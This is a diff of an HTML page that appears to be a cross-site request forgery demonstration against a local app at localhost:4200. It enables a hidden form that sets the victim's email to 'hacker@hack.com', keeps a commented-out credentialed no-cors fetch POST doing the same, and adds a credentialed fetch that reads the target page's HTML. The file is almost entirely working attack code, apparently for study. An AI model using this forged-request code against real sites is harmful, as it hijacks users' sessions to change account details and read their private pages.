@@ -10,32 +10,29 @@
 		<div>
 			<h1>Some nice website!</h1>
 			<!-- BAD WAY! -->
-			<!-- <form name="form" action="http:localhost:4200/edit" method="POST">
+			<form name="form" action="http:localhost:4200/edit" method="POST">
 				<input type="hidden" name="email" value="hacker@hack.com" />
-			</form> -->
+			</form>
 		</div>
 		<script>
 			// BAD WAY!
 			//document.form.submit();
 
-			fetch("http://localhost:4200/edit", {
-				method: "POST",
+			// fetch('http://localhost:4200/edit', {
+			//   method: 'POST',
+			//   credentials: 'include',
+			//   mode: 'no-cors',
+			//   headers: {
+			//     'Content-Type': 'application/x-www-form-urlencoded',
+			//   },
+			//   body: 'email=hacker@hack.com',
+			// })
+			//   .then(res => console.log(res.status))
+			//   .catch(err => console.log(err));
 
-				// Avoid console errors
-				mode: "no-cors",
-
-				// Take session credentials (sid)
-				credentials: "include",
-
-				// send a header to fool the browser
-				// as you were sending data from a form
-				headers: {
-					"Content-Type": "application/x-www-form-urlencoded",
-				},
-				// body as parameters
-				body: "email=hacker@hack.com",
-			})
-				.then((res) => console.log(res.status))
+			fetch("http://localhost:4200/edit", {credentials: "include"})
+				.then((res) => res.text())
+				.then((html) => console.log(html))
 				.catch((err) => console.log(err));
 		</script>
 	</body>
